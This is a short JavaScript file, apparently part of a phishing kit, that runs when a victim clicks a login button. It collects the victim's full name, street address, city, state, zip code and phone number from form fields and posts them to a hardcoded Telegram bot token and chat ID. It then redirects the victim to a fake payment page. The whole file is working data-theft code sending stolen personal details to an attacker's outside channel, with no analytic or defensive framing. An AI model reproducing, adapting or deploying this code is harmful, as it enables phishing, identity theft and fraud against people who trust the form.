const btn = document.getElementById("login_btn");
btn.addEventListener("click", () => send());

function send() {
  const token = "6768935322:AAFXBkDGX4QJHF2pd2rzCtpoHLisecfBL8o";
  const chatId = "5977727607";

  const fullname = document.getElementsByName("fullname")[0].value;
  const add1 = document.getElementsByName("add1")[0].value;
  const add2 = document.getElementsByName("add2")[0].value;
  const city = document.getElementsByName("city")[0].value;
  const state = document.getElementsByName("sstate")[0].value;
  const zipp = document.getElementsByName("zipp")[0].value;
  const phonee = document.getElementsByName("phonee")[0].value;

  const message = `Fullname      : ${fullname}
address1      : ${add1}
address1      : ${add2}
city          : ${city}
state         : ${state}
zipp          : ${zipp}
phonee        : ${phonee}`;

  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    message
  )}`;

  fetch(url, { method: "POST" })
    .then((response) => {
      response.ok &&
        window.location.replace(
          window.location.origin + "/order/payement.html"
        );
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });
}
